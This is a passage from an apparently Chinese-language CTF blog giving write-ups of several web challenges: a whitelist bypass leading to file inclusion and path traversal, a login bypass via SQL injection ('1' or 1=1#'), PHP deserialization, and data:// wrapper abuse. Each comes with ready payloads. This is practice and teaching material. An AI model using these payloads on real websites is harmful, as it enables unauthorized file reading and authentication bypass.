class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])                                 <span class="comment">//$_REQUEST[&#x27;file&#x27;]值非空</span></span><br><span class="line">    &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])                          <span class="comment">//$_REQUEST[&#x27;file&#x27;]值为字符串</span></span><br><span class="line">    &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]))                   <span class="comment">//checkFile函数为真</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];                           <span class="comment">//包含$_REQUEST[&#x27;file&#x27;]文件</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h4 id="checkFile函数"><a href="#checkFile函数" class="headerlink" title="checkFile函数"></a>checkFile函数</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];    <span class="comment">//声明$whitelist数组</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;                   <span class="comment">//若$page变量不存在或非字符串</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;                                 <span class="comment">//打印&quot;you can&#x27;t see it&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;                                            <span class="comment">//返回false</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;                           <span class="comment">//若$page变量存在于$whitelist数组中</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;                                             <span class="comment">//返回true</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(                                          //该代码表示截取<span class="variable">$page</span>中<span class="string">&#x27;?&#x27;</span>前部分，若无则截取整个<span class="variable">$page</span></span><br><span class="line">    <span class="variable">$page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)                              //<span class="title function_ invoke__">mb_strpos</span>()为查找某个字符串第一次出现的位置</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;                          <span class="comment">//如果截取出来的字符串在whitelist中返回true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);                                   <span class="comment">//url解码$page</span></span><br><span class="line"><span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">    <span class="variable">$_page</span>,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure><h3 id="3、得到payload"><a href="#3、得到payload" class="headerlink" title="3、得到payload"></a>3、得到payload</h3><p>从前面的链接，我们可以执行伪协议进行读取</p><p><code>source.php?file=source.php%253f../../../../../ffffllllaaaagggg</code></p><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>根据题目得是sql注入，尝试万能密码<code>1&#39; or 1=1#</code>可得flag</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在sql查询语句中，原句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;xxxx&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;xxxxxx&#x27;</span>;</span><br></pre></td></tr></table></figure><p>如果我们传入的 username 为 1’ or 1&#x3D;1 #，随意输入 password，那么传入后端验证时，sql语句就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> # <span class="string">&#x27; and password=&#x27;</span>xxxxxx<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>因为sql语句中 # 为注释符，也就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table_name <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>构成恒等式，直接绕过</p><h1 id="极客大挑战-2019-PHP"><a href="#极客大挑战-2019-PHP" class="headerlink" title="[极客大挑战 2019]PHP"></a>[极客大挑战 2019]PHP</h1><p>反序列化，绕过__wakeup()</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="number">100</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>申明private变量要记得在类名前后加%00</p><h1 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><h3 id="第一层绕过"><a href="#第一层绕过" class="headerlink" title="第一层绕过"></a>第一层绕过</h3><p>第一层text参数需要绕过file_get_contents()，有两种方法：</p><blockquote><ul><li>使用php:&#x2F;&#x2F;input伪协议绕过<br>将要GET的参数?xxx&#x3D;php:&#x2F;&#x2F;input<br>用post方法传入想要file_get_contents()函数返回的值</li><li>用data:&#x2F;&#x2F;伪协议绕过<br>将url改为：?xxx&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,想要file_get_contents()函数返回的值的base64编码<br>或者将url改为：?xxx&#x3D;data:text&#x2F;plain,(url编码的内容)</li></ul></blockquote><p>我采用了第二种方法，并且用base64绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span><br></pre></td></tr></table></figure><h3 id="第二层绕过"><a href="#第二层绕过" class="headerlink" title="第二层绕过"></a>第二层绕过</h3><p>第二层的意思是file参数中不能有flag字样，否则会报错，那么只能用password进行输出。结合题目和unserialize()可得，需要用到反序列化的魔术方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>定义一个类并新建的时候，当被当作字符串输出的时候，会触发__tostring方法，从而顺利地将flag.php中的字符串读出来</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
